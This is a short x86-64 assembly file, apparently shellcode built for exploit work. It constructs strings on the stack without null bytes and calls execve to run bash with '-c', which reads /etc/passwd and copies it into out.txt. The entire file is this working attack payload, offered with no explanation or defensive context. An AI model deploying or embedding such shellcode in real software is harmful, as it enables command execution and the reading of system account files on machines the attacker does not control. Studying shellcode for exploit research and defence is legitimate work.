section .text
global _start
_start:

	xor rax, rax
	push rax
	mov rbx, qword 0x687361622f2f2f2f 	;  hsab//// 
	push rbx
	mov rbx, qword 0x2f2f2f2f6e69622f 	;  ////nib/
	push rbx
	push rsp
	pop rdi

	push rax
	push word 0x632d 	;        c- 
	push rsp
	pop rcx
	
	push rax
	mov rbx, qword 0x7478742e74756f20 	;  txt.tuo  
	push rbx	
	mov rbx, qword 0x6565747c20647773 	;  eet| dws 
	push rbx
	mov rbx, qword 0x7361702f2f637465 	;  sap//cte 
	push rbx
	mov rbx, qword 0x2f2f207461632f2f 	;  // tac// 
	push rbx
	mov rbx, qword 0x2f2f6e69622f2f2f 	;  //nib///	
	push rbx
	push rsp
	pop r8

	push rax
	push r8
	push rcx
	push rdi
	push rsp
	pop rsi

	push rax
	push rsp
	pop rdx

	add al, 59
	syscall



	
